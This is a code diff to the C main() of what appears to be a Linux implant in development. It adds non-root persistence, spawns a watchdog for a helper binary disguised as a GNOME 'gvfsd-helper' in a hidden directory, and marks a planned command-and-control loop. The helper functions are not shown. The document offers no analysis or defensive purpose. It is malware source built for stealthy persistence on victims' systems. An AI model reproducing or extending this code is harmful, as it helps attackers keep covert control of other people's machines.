@@ -5,7 +5,7 @@
 #include <stdio.h>
 #include <stdbool.h>
 #include <errno.h>
-
+// custom functions
 #include "utils.h"
 #include "persistence.h"
 
@@ -15,7 +15,6 @@ int main(int argc, char *argv[]) {
     int pid = getpid();
 
     // TODO: session_dbus_file_write
-
     create_lock();
 
     // Creating shared mem w/ unique key
@@ -37,13 +36,26 @@ int main(int argc, char *argv[]) {
     printf("PID written to sharedmem: %s\n", (char *)addr);
 
     // if non root do ...
+    //char *fpath; // filepath
+
+    // TODO: session_dbus_file_write
+
+    // Creating shared mem
+   bool result = nonroot_persistence();
+
+    if (result == false) {
+        printf("Failed to write data!\n");
+        return 1;
+    }
+
+
+    // if non root do ....
     if (id == 0) {
         //daemon(0, 0);  // detach from current console
         // TODO - spawn root thread, and perform root operations
         spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
 
     } else { // non-root user....
-
         bool desktop_res = nonroot_desktop_persistence();
         if (desktop_res == false ) {
             fprintf(stderr, "[main] Error creating nonroot desktop persistence: %s",
@@ -67,7 +79,6 @@ int main(int argc, char *argv[]) {
    }
 
     // TODO: main_c2_loop goes here.
-
     free(c_pid);
     return 0;
 }
